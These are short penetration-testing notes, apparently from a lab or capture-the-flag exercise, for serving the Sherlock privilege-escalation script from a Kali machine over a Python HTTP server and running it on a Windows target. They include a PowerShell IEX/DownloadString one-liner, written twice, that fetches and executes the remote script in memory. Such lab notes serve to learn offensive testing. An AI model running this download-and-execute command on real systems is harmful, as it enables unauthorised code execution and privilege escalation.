# Scenario
We have a Windows machine.  
We can log on with user access.  
Whenever we run *powershell -ep bypass* -> we get the empty land shell.  
So we need to download sherlock.ps1 from Kali attack machine: 10.10.16.18 and run it on this Windows machine

# Steps to follow
1. Put file sherlock.ps1 into /root/transfer/
2. Start a HTTP server with python3: *python3 -m http.server 80*
3. From victim's machine, run this:
3. *echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.18/sherlock.ps1') | powershell -noprofile -
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.18/sherlock.ps1') | powershell -noprofile -*

Note: Run this command in a folde where you hae the write permission C:\temp - for example.